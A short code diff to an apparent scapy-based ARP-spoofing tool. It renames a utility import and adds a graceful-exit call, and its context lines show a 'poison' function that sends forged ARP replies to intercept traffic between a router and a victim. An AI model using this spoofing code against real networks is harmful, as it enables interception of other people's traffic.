@@ -10,7 +10,7 @@ import logging
 import itertools
 from scapy.all import *
 
-import utils as util
+import utils
 
 
 def _arp_registered_MAC(ip, interface=Ether):
@@ -52,7 +52,7 @@ def poison(routerIP, victimIP, attackerIP, interface='eth0'):
         send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC, hwsrc=routerMAC))
         send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC, hwsrc=victimMAC))
 
-    with util.ip_forwarding():
+    with utils.ip_forwarding():
         signal.signal(signal.SIGINT, _signal_handler)
         while True:
             send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=attackerMAC, hwsrc=victimMAC), count=3)
@@ -112,6 +112,7 @@ def flush(ip=None, interface=None):
 
 
 if __name__ == '__main__':
-    util.assure_root()
+    utils.assure_root()
+    utils.config_graceful_exit()
     logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
     argh.dispatch_commands([poison, flush, monitor, display])
